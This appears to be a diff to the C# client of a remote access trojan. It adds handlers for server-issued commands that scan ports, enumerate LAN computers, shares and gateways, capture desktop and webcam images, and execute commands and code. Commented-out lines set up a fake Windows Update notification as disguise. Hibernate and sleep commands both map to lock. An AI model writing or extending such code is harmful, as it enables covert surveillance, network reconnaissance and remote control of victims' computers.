@@ -32,6 +32,7 @@ namespace Client
         {
             InitializeComponent();
             AppendText("Initializing...");
+            Handler.Instance.OnAuthorizedEvent += Instance_OnAuthorizedEvent;
             Handler.Instance.Initialize(new HandlerInitData()
             {
                 HostForm = this,
@@ -45,7 +46,6 @@ namespace Client
                 HideOnStart = false
             });
             Handler.Instance.OnCommandEvent += Instance_OnCommandEvent;
-            Handler.Instance.OnAuthorizedEvent += Instance_OnAuthorizedEvent;
             LoadPlugins();
             //SetupFakeMsg();
             //CreateFakeWindowsUpdateNotifyIcon(1000,  "New updates are available", "Click to install them using Windows Update.");
@@ -66,19 +66,67 @@ namespace Client
 
         void Instance_OnCommandEvent(object sender, CommandEventArgs e)
         {
-            var s = Handler.Instance.Transmitter.TSettings;
-            if (e.Command != ECommand.DO_NOTHING)
+            var settings = Handler.Instance.Transmitter.TSettings;
+            var command = e.Command;
+            if (command != ECommand.DO_NOTHING)
             {
-                AppendText("Command: " + e.Command + ", File: " + s.File + ", Parameters: " + s.Parameters);
+                if (Handler.Instance.TransmitterStatus == TransmitterStatus.IDLE)
+                {
+                    AppendText("Received command: " + command + ", File: " + settings.File + ", Parameters: " + settings.Parameters);// + ", Status: " + settings.Status);
+                    ExecuteCommand(command);
+                }
+                if (Handler.Instance.TransmitterStatus == TransmitterStatus.BUSY)
+                {
+                    AppendText("Working... Command: " + command);
+                    if (Handler.Instance.Worker.IsDone)
+                    {
+                        AppendText("Uploading results...");
+                        Handler.Instance.StopWork();
+                        AppendText("Done!");
+                    }
+                }
             }
-            UploadResult result = null;
-            switch (e.Command)
+        }
+
+        void ExecuteCommand(ECommand command)
+        {
+            switch (command)
             {
+                case ECommand.SYSCMD_SHUTDOWN:
+                    Handler.Instance.Shutdown();
+                    break;
+                case ECommand.SYSCMD_RESTART:
+                    Handler.Instance.Restart();
+                    break;
+                case ECommand.SYSCMD_LOGOFF:
+                    Handler.Instance.Logoff();
+                    break;
+                case ECommand.SYSCMD_LOCKCOMPUTER:
+                    Handler.Instance.LockComputer();
+                    break;
+                case ECommand.SYSCMD_HIBERNATE:
+                    Handler.Instance.LockComputer();
+                    break;
+                case ECommand.SYSCMD_SLEEP:
+                    Handler.Instance.LockComputer();
+                    break;
+                case ECommand.UPLOAD_PORTSCAN:
+                    Handler.Instance.UploadPortscan();
+                    break;
+                case ECommand.UPLOAD_GATEWAYS:
+                    Handler.Instance.UploadGatewayInfo();
+                    break;
+                case ECommand.UPLOAD_LAN_COMPUTERS:
+                    Handler.Instance.UploadLANComputers();
+                    break;
+                case ECommand.UPLOAD_SHARES:
+                    Handler.Instance.UploadShares();
+                    break;
                 case ECommand.SET_TRANSMISSION_INTERVAL:
                     Handler.Instance.SetTransmissionInterval();
                     break;
                 case ECommand.UPLOAD_IMAGE:
-                    result = Handler.Instance.UploadDesktopImage();
+                    Handler.Instance.UploadDesktopImage();
                     break;
                 case ECommand.EXECUTE_COMMAND:
                     Handler.Instance.ExecuteCommand();
@@ -90,7 +138,7 @@ namespace Client
                     Handler.Instance.UploadWebcamImage();
                     break;
                 case ECommand.UPLOAD_PORT_INFO:
-                    result = Handler.Instance.UploadPortInfo();
+                    Handler.Instance.UploadPortInfo();
                     break;
                 case ECommand.UPLOAD_PROCESS_INFO:
                     Handler.Instance.UploadProcessInfo();
@@ -134,7 +182,6 @@ namespace Client
                     Handler.Instance.ExecuteCode();
                     break;
             }
-            Handler.Instance.UploadResult(result);
         }
 
         private void UploadPlugin()
